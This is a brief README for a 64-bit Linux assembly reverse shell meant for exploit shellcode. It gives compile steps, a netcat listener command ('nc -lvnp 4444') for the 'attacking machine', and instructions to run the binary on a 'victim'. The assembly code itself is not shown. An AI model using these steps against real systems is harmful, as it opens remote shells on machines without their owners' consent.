# x64_Linux_ASM_Reverse_Shell
A simple 64bit linux assembly reverse shell, can be use to generate shellcodes for exploits

It's really lightweight and can be used either for shellcodes or directly as reverse shell.

**Usage**
Don't forget to change ip in code - it's in reverse byte order

*Compile:*
| gcc reverse_shell.s -o reverse_shell
*On attacking machine:*
| nc -lvnp 4444
*On victim:*
| ./reverse_shell


Made by Pim
